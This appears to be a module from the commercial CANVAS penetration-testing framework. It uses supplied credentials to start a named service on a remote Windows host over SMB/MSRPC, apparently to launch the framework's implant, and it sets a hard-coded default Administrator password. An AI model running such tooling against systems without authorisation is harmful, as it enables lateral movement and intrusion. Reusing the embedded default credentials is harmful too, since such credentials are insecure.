#!/usr/bin/env python

# The information provided below is only available to subscribers of Immunity's Early Updates
# and is subject to the terms of the Immunity CANVAS Software License Agreement located here:
#
# https://www.immunityinc.com/downloads/license.txt
#
# It is the customer's responsibility to maintain the confidentiality of this information, and
# any tools, techniques, or information provided as part of the Immunity's CANVAS Early Update
# Program.

# This information is not for re-release to any third party, including contractors, consultants,
# and temporary workers.

import sys
if "." not in sys.path:
    sys.path.append(".")

from exploitutils import *
from tcpexploit import *
import libs.newsmb.svcctl as svcctl

# GUI info
NAME                   = "Start Remote Service"
DESCRIPTION            = "Starts a remote service over SMB"
VERSION                = "2.0"

DOCUMENTATION                     = {}
DOCUMENTATION['Date public']      = ''
DOCUMENTATION['References']       = ''
DOCUMENTATION['VersionsAffected'] = ''
DOCUMENTATION["Repeatability"]    = ''
DOCUMENTATION["Notes"]            = """
This module will attempt to make MSRPC calls in order to start a specific service.
"""

PROPERTY                         = {}
PROPERTY['TYPE']                 = "Commands"
PROPERTY['SITE']                 = "Remote"
PROPERTY['ARCH']                 = [ ["Windows"] ]
PROPERTY['VERSION']              = ['2000', 'XP', '2003', '2008']

class theexploit(tcpexploit):
    def __init__(self):
        tcpexploit.__init__(self)
        self.version             = 0
        self.host                = ""
        self.name                = NAME
        self.serviceName         = "helloservice"
        self.msrpcuser           = "Administrator"
        self.msrpcpassword       = "jbone"
        self.domain              = ""

    def test(self):
        ret = svcctl.SVCCTL_IsServiceInstalled(self.host, self.msrpcuser, self.msrpcpassword, self.domain, self.serviceName)
        if not ret:
            self.log("The service is not installed.")
            return 0
        return 1

    def getargs(self):
        self.host          = self.target.interface
        self.serviceName   = self.argsDict.get("serviceName", self.serviceName)
        self.msrpcuser     = self.argsDict.get("msrpcuser", self.msrpcuser)
        self.msrpcpassword = self.argsDict.get("msrpcpassword", self.msrpcpassword)
        self.domain        = self.argsDict.get("domain", self.domain)

    def run(self):
        self.getargs()

        if not self.test():
            return 0

        self.log("Starting Windows Service")

        try:
            self.mySVC = svcctl.SVCCTLClient(self.host)
            self.mySVC.set_credentials(username=self.msrpcuser, password=self.msrpcpassword, domain=self.domain)
            if not self.mySVC.bind():
                self.log("Unable to connect to the RPC interface: bind failed.")
                return 0
        except Exception as e:
            self.log("Unable to connect to the RPC interface: %s" % str(e))
            return 0

        self.log('Connected!')

        try:
            handle = self.mySVC.open_manager()
        except Exception as e:
            self.log('Failed to contact the service manager: %s' % (str(e)))
            return 0

        try:
            service_handle = self.mySVC.open_service(self.serviceName)
        except Exception as e:
            self.log("Was unable to call OpenService: %s" % str(e))
            return 0

        try:
            self.mySVC.start_service(service_handle)
        except Exception as e:
            self.log("There was an error starting the MOSDEF service: %s" % str(e))
            return 0

        self.log("Successfully started the service %s." % self.serviceName)

        # Closing everything.
        self.mySVC.close_service(service_handle)
        self.mySVC.close_manager()
        return 1


if __name__== '__main__':
    print "Running CANVAS %s Exploit v %s" % (DESCRIPTION,VERSION)
    app = theexploit()
    ret = standard_callback_commandline(app)
    if ret not in [0,1,None]:
        ret.interact()

